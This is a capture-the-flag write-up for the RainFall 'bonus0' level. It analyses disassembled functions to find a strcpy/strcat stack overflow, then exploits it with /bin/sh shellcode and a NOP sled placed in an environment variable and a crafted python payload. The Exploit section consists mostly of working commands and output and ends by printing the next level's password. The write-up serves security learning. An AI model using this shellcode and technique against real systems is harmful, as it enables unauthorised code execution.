# bonus0

1. [Analysis](#analysis)
2. [Exploit](#exploit)

## Analysis

```gdb
gdb-peda$ disas main
Dump of assembler code for function main:
   0x080485a4 <+0>:     push   ebp
   0x080485a5 <+1>:     mov    ebp,esp
   0x080485a7 <+3>:     and    esp,0xfffffff0
   0x080485aa <+6>:     sub    esp,0x40                             ; add 64 bytes of stack space
   0x080485ad <+9>:     lea    eax,[esp+0x16]                       ; eax = buffer address
   0x080485b1 <+13>:    mov    DWORD PTR [esp],eax                  ; load 1st arg of <pp> (buffer)
   0x080485b4 <+16>:    call   0x804851e <pp>                       ; pp(buffer)
   0x080485b9 <+21>:    lea    eax,[esp+0x16]                       ; eax = buffer address
   0x080485bd <+25>:    mov    DWORD PTR [esp],eax                  ; load 1st arg of <puts> (buffer)
   0x080485c0 <+28>:    call   0x80483b0 <puts@plt>                 ; puts(buffer)
   0x080485c5 <+33>:    mov    eax,0x0                              ; eax = 0 (function return value)
   0x080485ca <+38>:    leave
   0x080485cb <+39>:    ret
End of assembler dump.
```

```gdb
gdb-peda$ disas pp
Dump of assembler code for function pp:
   0x0804851e <+0>:      push   ebp
   0x0804851f <+1>:      mov    ebp,esp
   0x08048521 <+3>:      push   edi
   0x08048522 <+4>:      push   ebx
   0x08048523 <+5>:      sub    esp,0x50                            ; add 80 bytes of stack space
   0x08048526 <+8>:      mov    DWORD PTR [esp+0x4],0x80486a0       ; load 2nd arg of <p> (" - ")
   0x0804852e <+16>:     lea    eax,[ebp-0x30]                      ; eax = buffer2 (20 bytes, on stack)
   0x08048531 <+19>:     mov    DWORD PTR [esp],eax                 ; load 1st arg of <p> (buffer2)
   0x08048534 <+22>:     call   0x80484b4 <p>                       ; p(buffer2, " - ")
   0x08048539 <+27>:     mov    DWORD PTR [esp+0x4],0x80486a0       ; load 2nd arg of <p> (" - ")
   0x08048541 <+35>:     lea    eax,[ebp-0x1c]                      ; eax = buffer3 (20 bytes, on stack)
   0x08048544 <+38>:     mov    DWORD PTR [esp],eax                 ; load 1st arg of <p> (buffer3)
   0x08048547 <+41>:     call   0x80484b4 <p>                       ; p(buffer3, " - ")
   0x0804854c <+46>:     lea    eax,[ebp-0x30]                      ; eax = buffer2
   0x0804854f <+49>:     mov    DWORD PTR [esp+0x4],eax             ; load 2nd arg of <strcpy> (buffer2)
   0x08048553 <+53>:     mov    eax,DWORD PTR [ebp+0x8]             ; eax = buffer from main
   0x08048556 <+56>:     mov    DWORD PTR [esp],eax                 ; load 1st arg of <strcpy> (buffer)
   0x08048559 <+59>:     call   0x80483a0 <strcpy@plt>              ; strcpy(buffer, buffer2)
   0x0804855e <+64>:     mov    ebx,0x80486a4                       ; ebx = 0x80486a4 (' ')
   0x08048563 <+69>:     mov    eax,DWORD PTR [ebp+0x8]             ; eax = buffer (main)
   0x08048566 <+72>:     mov    DWORD PTR [ebp-0x3c],0xffffffff     ; prepare counter register (= -1)
   0x0804856d <+79>:     mov    edx,eax                             ; edx = eax (buffer)
   0x0804856f <+81>:     mov    eax,0x0                             ; eax = 0
   0x08048574 <+86>:     mov    ecx,DWORD PTR [ebp-0x3c]            ; ecx = -1
   0x08048577 <+89>:     mov    edi,edx                             ; edi = edx (buffer)
   0x08048579 <+91>:     repnz scas al,BYTE PTR es:[edi]            ; strlen(buffer)
   0x0804857b <+93>:     mov    eax,ecx                             ; eax = ecx (buffer length)
   0x0804857d <+95>:     not    eax                                 ; reverse eax value
   0x0804857f <+97>:     sub    eax,0x1                             ; sub 1 to eax -> final buffer length
   0x08048582 <+100>:    add    eax,DWORD PTR [ebp+0x8]             ; buffer += buffer_length
   0x08048585 <+103>:    movzx  edx,WORD PTR [ebx]                  ; edx = ebx (' ')
   0x08048588 <+106>:    mov    WORD PTR [eax],dx                   ; *buffer = ' '
   0x0804858b <+109>:    lea    eax,[ebp-0x1c]                      ; eax = buffer3
   0x0804858e <+112>:    mov    DWORD PTR [esp+0x4],eax             ; load 2nd arg of <strcat> (buffer3)
   0x08048592 <+116>:    mov    eax,DWORD PTR [ebp+0x8]             ; eax = buffer
   0x08048595 <+119>:    mov    DWORD PTR [esp],eax                 ; load 1st arg of <strcat> (buffer)
   0x08048598 <+122>:    call   0x8048390 <strcat@plt>              ; strcat(buffer, buffer3)
   0x0804859d <+127>:    add    esp,0x50                            ; restore stack ptr to its previous value
   0x080485a0 <+130>:    pop    ebx
   0x080485a1 <+131>:    pop    edi
   0x080485a2 <+132>:    pop    ebp
   0x080485a3 <+133>:    ret
End of assembler dump.
```

Interesting functions here : `strcpy` which is vulnerable to buffer overflow attack, and `strcat` which is vulnerable too, especially if the first parameter (char *s1) does not have enough space to hold the second parameter (char *s2) appended to it.

```gdb
gdb-peda$ disas p
Dump of assembler code for function p:
   0x080484b4 <+0>:      push   ebp
   0x080484b5 <+1>:      mov    ebp,esp
   0x080484b7 <+3>:      sub    esp,0x1018                          ; 4120 bytes of stack space
   0x080484bd <+9>:      mov    eax,DWORD PTR [ebp+0xc]             ; eax = " - "
   0x080484c0 <+12>:     mov    DWORD PTR [esp],eax                 ; load <puts> arg
   0x080484c3 <+15>:     call   0x80483b0 <puts@plt>                ; puts(" - ")
   0x080484c8 <+20>:     mov    DWORD PTR [esp+0x8],0x1000          ; load read 3rd arg (4096)
   0x080484d0 <+28>:     lea    eax,[ebp-0x1008]                    ; eax = read_buffer (declared on stack)
   0x080484d6 <+34>:     mov    DWORD PTR [esp+0x4],eax             ; load 2nd arg of <read> (read_buffer)
   0x080484da <+38>:     mov    DWORD PTR [esp],0x0                 ; load 1st arg of <read> (0 aka stdin)
   0x080484e1 <+45>:     call   0x8048380 <read@plt>                ; read(0, read_buffer, 4096)
   0x080484e6 <+50>:     mov    DWORD PTR [esp+0x4],0xa             ; load 2nd arg of <strchr> ('\n')
   0x080484ee <+58>:     lea    eax,[ebp-0x1008]                    ; eax = read_buffer
   0x080484f4 <+64>:     mov    DWORD PTR [esp],eax                 ; load <strchr> 1st arg (read_buffer)
   0x080484f7 <+67>:     call   0x80483d0 <strchr@plt>              ; strchr(read_buffer, '\n')
   0x080484fc <+72>:     mov    BYTE PTR [eax],0x0                  ; content of strchr returned ptr = '\0'
   0x080484ff <+75>:     lea    eax,[ebp-0x1008]                    ; eax = read_buffer
   0x08048505 <+81>:     mov    DWORD PTR [esp+0x8],0x14            ; load 3rd arg of <strncpy> (20) 
   0x0804850d <+89>:     mov    DWORD PTR [esp+0x4],eax             ; load 2nd arg of <strncpy> (read_buffer)
   0x08048511 <+93>:     mov    eax,DWORD PTR [ebp+0x8]             ; eax = buffer from <pp> function
   0x08048514 <+96>:     mov    DWORD PTR [esp],eax                 ; load 1st arg of <strncpy> (buffer)
   0x08048517 <+99>:     call   0x80483f0 <strncpy@plt>             ; strncpy(buffer, read_buffer, 20)
   0x0804851c <+104>:    leave
   0x0804851d <+105>:    ret
End of assembler dump.
```

Notice here the call to a 4096 bytes long `read`, followed by the usage of the first 20th characters read only. `strncpy` seems to protect the copy but we should probably investigate on this part of the code too.

> Note : In order to be as explicit as possible, we will use the following terms to distinguish the different buffers used in the program :
- main buffer : 42 byte long, declared in the `main`, and filled in `pp` function.
- middle buffer 1 and 2 : 20 byte long, declared in `pp` function, sent to `p` to be filled, then copied to the main buffer
- read buffer : 4096 byte long, declared in `p` function, filled by a call to `read` and then copied into one of the middle buffers. 

Since the program waits twice for an user input and stores the result in the two middle buffers, we try to send 20+ characters on both `read` calls and a crash occurs. From here, we try to understand why.

The function `p` read at most 4096 characters from the standard input, replace the first occurence of the '\n' character in the read buffer by a '\0', then use `strncpy` to copy at most 20 characters from the read buffer to the middle buffer sent to the function as a parameter. According to this process, we will be able to fill each middle buffer with 20 characters without any terminating '\0'. Interesting... 

Then, in `pp` function, the middle buffers are copied to the main buffer following these steps :
- First, middle buffer 1 is copied with `strcpy`, allowing us to go further if the expected '\0' is missing.
- Then, the function goes through the main buffer to reach the end of the previous copy and replace the '\0' with a 'space'.
- Finally, `strcat` copies the 2nd middle buffer to the current address of the main buffer (after the space).

Thanks to the vulnerabilities found in the code, it is pretty obvious than we can exploit a buffer overflow attack on the main buffer. We will try a classic ROP (Return Oriented Programming) to overwrite the return instruction pointer of `main`.

## Exploit

Since we know that the middle buffers are contiguous on the stack (looking at their addresses), we expect to copy both on the main buffer with the `strcpy` call thanks to the missing '\0' at the end of the first middle buffer. This way we will almost fill the whole buffer, and then use the `strcat` call to oveflow the buffer and reach the return address.

Normal behaviour : the main buffer is filled with our input + the 'space' character added in `pp` + the terminating '\0' appended by `strcat`.
```console
bonus0@RainFall:~$ ./bonus0
 -
AAAABBBBCCCCDDDDEEE
 -
FFFFGGGGHHHHIIIIJJJ
AAAABBBBCCCCDDDDEEE FFFFGGGGHHHHIIIIJJJ
```

Overflow test : the main buffer is filled with our input which does not include any '\0' so `strcpy` copies the two middle buffers, the 'space' is inserted, then `strcat` append a new occurence of the 2nd middle buffer
```console
bonus0@RainFall:~$ ./bonus0
 -
AAAABBBBCCCCDDDDEEEE
 -
FFFFGGGGHHHHIIIIJJJJ
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ�� FFFFGGGGHHHHIIIIJJJJ��
Segmentation fault (core dumped)
```

As usual, we use a buffer overflow eip string generator to find the good offset to reach the `main` return address. This offset is after the ninth character of the second string (middle buffer 2).

The only thing we need now is an address where we can jump and execute some code to spawn a shell. Due to the lack of space in the buffer, we will jump elsewhere on the stack. The environment is a good place to store our shellcode, since it is sent to any program via the third argument of `main`, so it is put on the stack.

We use the same shellcode as in the level2, which run `execve("/bin/sh", ["/bin/sh"], NULL)` and assign it to an environment variable. We add a NOP sled to create a large range of address where we can jump to.

```console
bonus0@RainFall:~$ export SHELLCODE=`python -c 'print "\x90"*50 + "\xeb\x16\x31\xc0\x5b\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"'`
bonus0@RainFall:~$ env | grep SHELLCODE
SHELLCODE=���������������������������������������������������1�[�C��C
                                                                     �
                                                                      ��S
                                                                          ̀�����/bin/sh
```

Finally, we look for the address where our variable is stored inside the `main`. To do so, [GDB peda](https://github.com/longld/peda) is very useful, since it displays the top of the stack in a human readable form.

```gdb
bonus0@RainFall:~$ gdb ./bonus0
Reading symbols from /home/user/bonus0/bonus0...(no debugging symbols found)...done.
gdb-peda$ start
[----------------------------------registers-----------------------------------]
EAX: 0x1
EBX: 0xb7fd0ff4 --> 0x1a4d7c
ECX: 0xbffff774 --> 0xbffff892 ("/home/user/bonus0/bonus0")
EDX: 0xbffff704 --> 0xb7fd0ff4 --> 0x1a4d7c
ESI: 0x0
EDI: 0x0
EBP: 0xbffff6d8 --> 0x0
ESP: 0xbffff6d8 --> 0x0
EIP: 0x80485a7 (<main+3>:	and    esp,0xfffffff0)
EFLAGS: 0x200246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80485a3 <pp+133>:	ret
   0x80485a4 <main>:	push   ebp
   0x80485a5 <main+1>:	mov    ebp,esp
=> 0x80485a7 <main+3>:	and    esp,0xfffffff0
   0x80485aa <main+6>:	sub    esp,0x40
   0x80485ad <main+9>:	lea    eax,[esp+0x16]
   0x80485b1 <main+13>:	mov    DWORD PTR [esp],eax
   0x80485b4 <main+16>:	call   0x804851e <pp>
[------------------------------------stack-------------------------------------]
0000| 0xbffff6d8 --> 0x0
0004| 0xbffff6dc --> 0xb7e454d3 (<__libc_start_main+243>:	mov    DWORD PTR [esp],eax)
0008| 0xbffff6e0 --> 0x1
0012| 0xbffff6e4 --> 0xbffff774 --> 0xbffff892 ("/home/user/bonus0/bonus0")
0016| 0xbffff6e8 --> 0xbffff77c --> 0xbffff8ab ("SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\353\026\061\300[\210C\a\211[\b\211C\f\260\v\215K\b\215S\f̀\350\345\377\377\377/bin/sh")
0020| 0xbffff6ec --> 0xb7fdc858 --> 0xb7e2c000 --> 0x464c457f
0024| 0xbffff6f0 --> 0x0
0028| 0xbffff6f4 --> 0xbffff71c --> 0x0
[------------------------------------------------------------------------------]
```

Our variable is stored at the address `0xbffff8ab`, we add something like 30 to jump over the beginning, especially the "SHELLCODE=" part and land into the NOP sled. Let's use the address `0xbffff8c9`.

We can now prepare our final string. Note that we will send the whole string to the standard input of the executable, but we need `read` to get it in two parts to fill the two middle buffers. So we will first send 4096 characters, including a terminating '\n', then 9 characters for the address offset + the address (4 bytes) + 7 characters to reach 20.

```console
bonus0@RainFall:~$ python -c 'print "A"*4095 + "\n" + "AAAAAAAAA" + "\xc9\xf8\xff\xbf" + "AAAAAAA"' > /tmp/bonus0
bonus0@RainFall:~$ cat /tmp/bonus0 - | ./bonus0
 -
 -
AAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAA�� AAAAAAAAA����AAAAAAA��
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```